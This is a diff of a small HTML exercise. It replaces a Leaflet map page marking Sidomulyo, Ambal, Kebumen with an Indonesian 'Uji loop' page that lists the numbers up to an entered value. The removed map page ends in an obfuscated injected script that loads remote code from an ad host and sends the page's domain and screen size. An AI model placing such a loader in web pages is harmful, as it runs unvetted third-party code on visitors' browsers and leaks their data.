@@ -1,39 +1,24 @@
 <!DOCTYPE html>
 <html>
-<head>
-	<link rel="stylesheet" href="http://cdn.leafletjs.com/leaflet-0.7.3/leaflet.css"/>
-</head>
 <body>
-	<div id="map" style="width: 600px; height: 400px"></div>
+<h2> Uji loop</h2>
+<p> Masukkan sebuah angka : </p>
+Angka: <input type="text" id="angka">
+<button onclick="klik()">Klik</button>
+<p id="isi"></p>
 
-	<script src="http://cdn.leafletjs.com/leaflet-0.7.3/leaflet.js"></script>
-	<script>
-
-		var map = L.map('map').setView([-7.73311, 109.76955], 13);
-
-		L.tileLayer('https://{s}.tiles.mapbox.com/v3/{id}/{z}/{x}/{y}.png', {
-			maxZoom: 18,
-			attribution: 'Map data &copy; <a href="http://openstreetmap.org">OpenStreetMap</a> contributors, ' +
-				'<a href="http://creativecommons.org/licenses/by-sa/2.0/">CC-BY-SA</a>, ' +
-				'Imagery Ã‚Â© <a href="http://mapbox.com">Mapbox</a>',
-			id: 'examples.map-i875mjb7'
-		}).addTo(map);
-
-
-		L.marker([-7.73311, 109.76955]).addTo(map)
-			.bindPopup("<b>Sidomulyo, Ambal, Kebumen</b><br />Aditya Sanjaya.").openPopup();
-
-		var popup = L.popup();
-
-		function onMapClick(e) {
-			popup
-				.setLatLng(e.latlng)
-				.setContent("You clicked the map at " + e.latlng.toString())
-				.openOn(map);
-		}
-
-		map.on('click', onMapClick);
-
-	</script>
-<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRS8t1IvA0MLb7tb0squRSHA9cOYBHm67BU4wB44EDPVvpU%2fjKgeBpzNHFs3SsM3SdJixLRTpX%2bB66GeBZQ2IzaECHUHnIERCE0tZQ9HqA6Fdt16MDemH6zlo%2bhQb0dhNhAUQMWmLFQODgX5Q95eMXIqZO0fzDHaor%2b9h8yqY75t8AYHRUPJWDRb89TPCj3BfatH4O%2ftSt7NvKiE4AqZ8E6Nic8jw%2bH31pKPvEj%2fuirCWdRecaeKxkBiF%2fpkZmx5dKK7Xc9L70GxC9u6hp%2b8vz4GRS9dXxnPkc1697GWln4KDlOX%2b90BXyMLIecM3N4HgK4qDB9qlRCi44onOiRJccJseZ7CvSeo5WlH%2f6ihtZ5KggFkUwekSWBimQbL9LUid6VO7vCU7d%2bTJ4vK5nOzUOur9dwNzMfRFWjXX%2f67lp8qhfqKsFtxlMPF2jH8oXO6%2bsJl4%2bWJaijB3o6MD9Llvrm7xIXVxcU%2fdDppkomTCqRcNnIn%2fr0TESDku9yzGe%2frY3zNEuTcmm3cJUzdFrGGTLOzVy8onXfZOBXlVo9LvKd8Y%3d");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body>
+<script>
+	function klik(){
+		var nilai;
+		nilai = document.getElementById("angka").value;
+		
+		var val="";
+		for (var i=0; i<=nilai; i++)
+			{
+				val = val + i + " ";
+			}
+		document.getElementById("isi").innerHTML=val;
+	}
+</script>
+</body>
 </html>
